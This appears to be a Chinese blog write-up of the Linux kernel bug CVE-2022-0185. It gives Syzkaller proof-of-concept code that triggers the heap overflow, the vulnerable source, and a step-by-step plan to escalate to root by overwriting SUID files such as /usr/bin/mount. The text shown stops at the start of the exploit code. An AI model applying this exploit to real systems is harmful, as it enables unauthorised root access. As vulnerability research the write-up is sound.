    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>初尝 pipe_primitive<br><img src="/images/4161b49f/pasted-2.png" alt="exploit"></p>
<span id="more"></span>

<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>据漏洞发现者所说<sup>[1][2]</sup>，漏洞影响 linux 5.1 版本之后的内核，v5.16.2 已经修复</p>
<p>笔者选取 <strong>5.10.6</strong> 自行编译内核复现，在 ubuntu 20.04 环境下构建，编译选项一般默认就行</p>
<p>因为笔者所使用的利用方式是参考 <strong>veritas501</strong> 学长的 <strong>pipe primitive</strong><sup>[3][4]</sup>，对含有 root suid 权限的文件进行覆盖达到提权的效果，构建的 busybox rootfs 中准备了一个含有 suid 权限的可执行文件用于被任意写覆盖</p>
<p><strong>实际环境中可以选择 /usr/bin/mount 等程序作为目标</strong></p>
<p>环境已打包至 github：<a href="https://github.com/featherL/CVE-2022-0185-exploit">https://github.com/featherL/CVE-2022-0185-exploit</a></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>Syzkaller 给出了一段触发漏洞的 Poc：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span> </span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;endian.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/syscall.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">__NR_fsconfig</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">__NR_fsconfig</span> <span class="token expression"><span class="token number">431</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">__NR_fsopen</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">__NR_fsopen</span> <span class="token expression"><span class="token number">430</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
<span class="token class-name">uint64_t</span> r<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0xffffffffffffffff</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token function">syscall</span><span class="token punctuation">(</span>__NR_mmap<span class="token punctuation">,</span> <span class="token number">0x1ffff000ul</span><span class="token punctuation">,</span> <span class="token number">0x1000ul</span><span class="token punctuation">,</span> <span class="token number">0ul</span><span class="token punctuation">,</span> <span class="token number">0x32ul</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0ul</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">syscall</span><span class="token punctuation">(</span>__NR_mmap<span class="token punctuation">,</span> <span class="token number">0x20000000ul</span><span class="token punctuation">,</span> <span class="token number">0x1000000ul</span><span class="token punctuation">,</span> <span class="token number">7ul</span><span class="token punctuation">,</span> <span class="token number">0x32ul</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0ul</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">syscall</span><span class="token punctuation">(</span>__NR_mmap<span class="token punctuation">,</span> <span class="token number">0x21000000ul</span><span class="token punctuation">,</span> <span class="token number">0x1000ul</span><span class="token punctuation">,</span> <span class="token number">0ul</span><span class="token punctuation">,</span> <span class="token number">0x32ul</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0ul</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">intptr_t</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x20000000</span><span class="token punctuation">,</span> <span class="token string">"9p\000"</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	res <span class="token operator">=</span> <span class="token function">syscall</span><span class="token punctuation">(</span>__NR_fsopen<span class="token punctuation">,</span> <span class="token number">0x20000000ul</span><span class="token punctuation">,</span> <span class="token number">0ul</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>res <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
		r<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> res<span class="token punctuation">;</span>
	<span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x20001c00</span><span class="token punctuation">,</span> <span class="token string">"\000\000\344]\233"</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x20000540</span><span class="token punctuation">,</span> <span class="token string">"&lt;long string>"</span><span class="token punctuation">,</span> <span class="token number">641</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">syscall</span><span class="token punctuation">(</span>__NR_fsconfig<span class="token punctuation">,</span> r<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1ul</span><span class="token punctuation">,</span> <span class="token number">0x20001c00ul</span><span class="token punctuation">,</span> <span class="token number">0x20000540ul</span><span class="token punctuation">,</span> <span class="token number">0ul</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> i<span class="token punctuation">;</span>
	<span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">64</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">syscall</span><span class="token punctuation">(</span>__NR_fsconfig<span class="token punctuation">,</span> r<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1ul</span><span class="token punctuation">,</span> <span class="token number">0x20001c00ul</span><span class="token punctuation">,</span> <span class="token number">0x20000540ul</span><span class="token punctuation">,</span> <span class="token number">0ul</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token function">memset</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x20000040</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x20000800</span><span class="token punctuation">,</span> <span class="token string">"&lt;long string>"</span><span class="token punctuation">,</span> <span class="token number">641</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">syscall</span><span class="token punctuation">(</span>__NR_fsconfig<span class="token punctuation">,</span> r<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1ul</span><span class="token punctuation">,</span> <span class="token number">0x20000040ul</span><span class="token punctuation">,</span> <span class="token number">0x20000800ul</span><span class="token punctuation">,</span> <span class="token number">0ul</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">64</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">syscall</span><span class="token punctuation">(</span>__NR_fsconfig<span class="token punctuation">,</span> r<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1ul</span><span class="token punctuation">,</span> <span class="token number">0x20000040ul</span><span class="token punctuation">,</span> <span class="token number">0x20000800ul</span><span class="token punctuation">,</span> <span class="token number">0ul</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>经过简化后：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/syscall.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">__NR_fsconfig</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">__NR_fsconfig</span> <span class="token expression"><span class="token number">431</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">__NR_fsopen</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">__NR_fsopen</span> <span class="token expression"><span class="token number">430</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">FSCONFIG_SET_STRING</span> <span class="token expression"><span class="token number">1</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">fsopen</span><span class="token expression"><span class="token punctuation">(</span>name<span class="token punctuation">,</span> flags<span class="token punctuation">)</span> <span class="token function">syscall</span><span class="token punctuation">(</span>__NR_fsopen<span class="token punctuation">,</span> name<span class="token punctuation">,</span> flags<span class="token punctuation">)</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">fsconfig</span><span class="token expression"><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> cmd<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> aux<span class="token punctuation">)</span> <span class="token function">syscall</span><span class="token punctuation">(</span>__NR_fsconfig<span class="token punctuation">,</span> fd<span class="token punctuation">,</span> cmd<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> aux<span class="token punctuation">)</span></span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
	<span class="token keyword">char</span><span class="token operator">*</span> key <span class="token operator">=</span> <span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	fd <span class="token operator">=</span> <span class="token function">fsopen</span><span class="token punctuation">(</span><span class="token string">"9p"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">130</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
		<span class="token function">fsconfig</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> FSCONFIG_SET_STRING<span class="token punctuation">,</span> <span class="token string">"\x00"</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>翻看 linux 源码可以知道，存在调用链 <a href="https://elixir.bootlin.com/linux/v5.10.6/source/fs/fsopen.c#L115">fsopen</a> -&gt; <a href="https://elixir.bootlin.com/linux/v5.10.6/source/fs/fs_context.c#L278">fs_context_for_mount</a> -&gt; <a href="https://elixir.bootlin.com/linux/v5.10.6/source/fs/fs_context.c#L267">alloc_fs_context</a> -&gt; <a href="https://elixir.bootlin.com/linux/v5.10.6/source/fs/fs_context.c#L632">legacy_init_fs_context</a>，这为后面的 fsconfig 系统调用，设置相关操作的虚表 <a href="https://elixir.bootlin.com/linux/v5.10.6/source/fs/fs_context.c#L619">legacy_fs_context_ops </a></p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">fs_context_operations</span> legacy_fs_context_ops <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
	<span class="token punctuation">.</span>free			<span class="token operator">=</span> legacy_fs_context_free<span class="token punctuation">,</span>
	<span class="token punctuation">.</span>dup			<span class="token operator">=</span> legacy_fs_context_dup<span class="token punctuation">,</span>
	<span class="token punctuation">.</span>parse_param		<span class="token operator">=</span> legacy_parse_param<span class="token punctuation">,</span>
	<span class="token punctuation">.</span>parse_monolithic	<span class="token operator">=</span> legacy_parse_monolithic<span class="token punctuation">,</span>
	<span class="token punctuation">.</span>get_tree		<span class="token operator">=</span> legacy_get_tree<span class="token punctuation">,</span>
	<span class="token punctuation">.</span>reconfigure		<span class="token operator">=</span> legacy_reconfigure<span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>对于 <code>fsconfig(fd, FSCONFIG_SET_STRING, key, value, 0)</code> 的调用，则经过调用链 <a href="https://elixir.bootlin.com/linux/v5.10.6/source/fs/fsopen.c#L439">fsconfig</a> -&gt; <a href="https://elixir.bootlin.com/linux/v5.10.6/source/fs/fsopen.c#L265">vfs_fsconfig_locked</a> -&gt; <a href="https://elixir.bootlin.com/linux/v5.10.6/source/fs/fs_context.c#L117">vfs_parse_fs_param</a> -&gt; <a href="https://elixir.bootlin.com/linux/v5.10.6/source/fs/fs_context.c#L533">legacy_parse_param</a></p>
<p>漏洞发生在 legacy_parse_param 函数中：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">legacy_parse_param</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">fs_context</span> <span class="token operator">*</span>fc<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">fs_parameter</span> <span class="token operator">*</span>param<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token keyword">struct</span> <span class="token class-name">legacy_fs_context</span> <span class="token operator">*</span>ctx <span class="token operator">=</span> fc<span class="token operator">-></span>fs_private<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span> size <span class="token operator">=</span> ctx<span class="token operator">-></span>data_size<span class="token punctuation">;</span>
	<span class="token class-name">size_t</span> len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>param<span class="token operator">-></span>key<span class="token punctuation">,</span> <span class="token string">"source"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>param<span class="token operator">-></span>type <span class="token operator">!=</span> fs_value_is_string<span class="token punctuation">)</span>
			<span class="token keyword">return</span> <span class="token function">invalf</span><span class="token punctuation">(</span>fc<span class="token punctuation">,</span> <span class="token string">"VFS: Legacy: Non-string source"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>fc<span class="token operator">-></span>source<span class="token punctuation">)</span>
			<span class="token keyword">return</span> <span class="token function">invalf</span><span class="token punctuation">(</span>fc<span class="token punctuation">,</span> <span class="token string">"VFS: Legacy: Multiple sources"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		fc<span class="token operator">-></span>source <span class="token operator">=</span> param<span class="token operator">-></span>string<span class="token punctuation">;</span>
		param<span class="token operator">-></span>string <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>ctx<span class="token operator">-></span>param_type <span class="token operator">==</span> LEGACY_FS_MONOLITHIC_PARAMS<span class="token punctuation">)</span>
		<span class="token keyword">return</span> <span class="token function">invalf</span><span class="token punctuation">(</span>fc<span class="token punctuation">,</span> <span class="token string">"VFS: Legacy: Can't mix monolithic and individual options"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">switch</span> <span class="token punctuation">(</span>param<span class="token operator">-></span>type<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">case</span> fs_value_is_string<span class="token operator">:</span>
		len <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">+</span> param<span class="token operator">-></span>size<span class="token punctuation">;</span>
		fallthrough<span class="token punctuation">;</span>
	<span class="token keyword">case</span> fs_value_is_flag<span class="token operator">:</span>
		len <span class="token operator">+=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>param<span class="token operator">-></span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">break</span><span class="token punctuation">;</span>
	<span class="token keyword">default</span><span class="token operator">:</span>
		<span class="token keyword">return</span> <span class="token function">invalf</span><span class="token punctuation">(</span>fc<span class="token punctuation">,</span> <span class="token string">"VFS: Legacy: Parameter type for '%s' not supported"</span><span class="token punctuation">,</span>
			      param<span class="token operator">-></span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>len <span class="token operator">></span> PAGE_SIZE <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">-</span> size<span class="token punctuation">)</span>
		<span class="token keyword">return</span> <span class="token function">invalf</span><span class="token punctuation">(</span>fc<span class="token punctuation">,</span> <span class="token string">"VFS: Legacy: Cumulative options too large"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strchr</span><span class="token punctuation">(</span>param<span class="token operator">-></span>key<span class="token punctuation">,</span> <span class="token string">','</span><span class="token punctuation">)</span> <span class="token operator">||</span>
	    <span class="token punctuation">(</span>param<span class="token operator">-></span>type <span class="token operator">==</span> fs_value_is_string <span class="token operator">&amp;&amp;</span>
	     <span class="token function">memchr</span><span class="token punctuation">(</span>param<span class="token operator">-></span>string<span class="token punctuation">,</span> <span class="token string">','</span><span class="token punctuation">,</span> param<span class="token operator">-></span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> <span class="token function">invalf</span><span class="token punctuation">(</span>fc<span class="token punctuation">,</span> <span class="token string">"VFS: Legacy: Option '%s' contained comma"</span><span class="token punctuation">,</span>
			      param<span class="token operator">-></span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ctx<span class="token operator">-></span>legacy_data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		ctx<span class="token operator">-></span>legacy_data <span class="token operator">=</span> <span class="token function">kmalloc</span><span class="token punctuation">(</span>PAGE_SIZE<span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ctx<span class="token operator">-></span>legacy_data<span class="token punctuation">)</span>
			<span class="token keyword">return</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	ctx<span class="token operator">-></span>legacy_data<span class="token punctuation">[</span>size<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">','</span><span class="token punctuation">;</span>
	len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>param<span class="token operator">-></span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">memcpy</span><span class="token punctuation">(</span>ctx<span class="token operator">-></span>legacy_data <span class="token operator">+</span> size<span class="token punctuation">,</span> param<span class="token operator">-></span>key<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>
	size <span class="token operator">+=</span> len<span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>param<span class="token operator">-></span>type <span class="token operator">==</span> fs_value_is_string<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		ctx<span class="token operator">-></span>legacy_data<span class="token punctuation">[</span>size<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'='</span><span class="token punctuation">;</span>
		<span class="token function">memcpy</span><span class="token punctuation">(</span>ctx<span class="token operator">-></span>legacy_data <span class="token operator">+</span> size<span class="token punctuation">,</span> param<span class="token operator">-></span>string<span class="token punctuation">,</span> param<span class="token operator">-></span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
		size <span class="token operator">+=</span> param<span class="token operator">-></span>size<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	ctx<span class="token operator">-></span>legacy_data<span class="token punctuation">[</span>size<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>
	ctx<span class="token operator">-></span>data_size <span class="token operator">=</span> size<span class="token punctuation">;</span>
	ctx<span class="token operator">-></span>param_type <span class="token operator">=</span> LEGACY_FS_INDIVIDUAL_PARAMS<span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到 <code>ctx-&gt;legacy_data</code> 通过 kmalloc-4k 分配的一块内存：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ctx<span class="token operator">-></span>legacy_data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		ctx<span class="token operator">-></span>legacy_data <span class="token operator">=</span> <span class="token function">kmalloc</span><span class="token punctuation">(</span>PAGE_SIZE<span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ctx<span class="token operator">-></span>legacy_data<span class="token punctuation">)</span>
			<span class="token keyword">return</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>而在写入数据是否越界的判断条件中，使用的是 <code>len &gt; PAGE_SIZE - 2 - size</code>，其中 size 变量是 <strong>unsigned int</strong> 类型，为 <code>ctx-&gt;legacy_data</code> 已经存入数据的大小，当 size 字段大于 <code>PAGE_SIZE - 2</code> 的时候，<code>PAGE_SIZE - 2 - size</code> 结果为负数，但因为运算结果是无符号类型，这就是一个很大的数，条件不成立，后续写入数据的时候就造成了 kmalloc-4k 堆块的溢出</p>
<p>可以知道 <code>fsconfig(fd, FSCONFIG_SET_STRING, key, value, 0)</code> 是往 <code>ctx-&gt;legacy_data</code> 这个堆块中以 <code>,key=value</code> 的方式写入键值对，不过要注意的是，在 fsconfig 的代码中可以发现 key 和 value 的字符串长度（包括<code>\0</code>）不能超过 <strong>256</strong>，所以要分多次调用来触发漏洞</p>
<p><strong>需要注意 fsopen 需要 CAP_SYS_ADMIN 权限，可以通过创建用户命名空间的方式来获得该权限</strong></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这个漏洞相当于一个 <strong>kmalloc-4k 的任意长度溢出漏洞</strong>，有了之前复现 CVE-2021-22555 的经验，利用起来很简单，甚至都不需要调试</p>
<p>简单总结一下步骤：</p>
<ol>
<li>触发漏洞溢出修改 msg_msg.m_ts</li>
<li>利用 corrupted_msg_msg 越界泄露信息，可以布局其他 msg_msg 结构体，泄露其 m_list.next/m_list.prev 的 heap 地址</li>
<li>有了 heap 地址，再次触发漏洞，修改 msg_msg.m_list.next 为 target，target 为堆上的某个 msg_msg 结构体地址</li>
<li>释放 target，喷射 skb 占位 target</li>
<li>通过步骤 3 中 corrupted_msg_msg，可以再次释放 target，造成 UAF</li>
<li>喷射 pipe_buffer 占位 target，splice 任意文件写到 pipe 里</li>
<li>利用 skb 修改 pipe_buffer 的 flags 字段，向 pipe 写入数据，造成越权改写只读文件</li>
</ol>
<p>最后两步其实可以 skb 读取 pipe_buffer 的 ops 泄露内核地址，然后 skb 劫持 pipe_buffer 的 ops，close(pipe) 进行 ROP，但笔者为了演示 pipe primitive 而不这么做</p>
<hr>
<h3 id="prepare-overflow"><a href="#prepare-overflow" class="headerlink" title="prepare overflow"></a>prepare overflow</h3><p>首先准备下触发漏洞越界写的条件，分多次调用 <code>FSCONFIG_SET_STRING</code>，使得 size 为 <code>PAGE_SIZE - 1</code> 绕过 check，那么再下一次 <code>FSCONFIG_SET_STRING</code> 的时候就是从 4k 堆块的最后一个字节开始溢出写了</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">call_fsopen</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">fsopen</span><span class="token punctuation">(</span><span class="token string">"ext4"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"fsopen() error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> fd<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

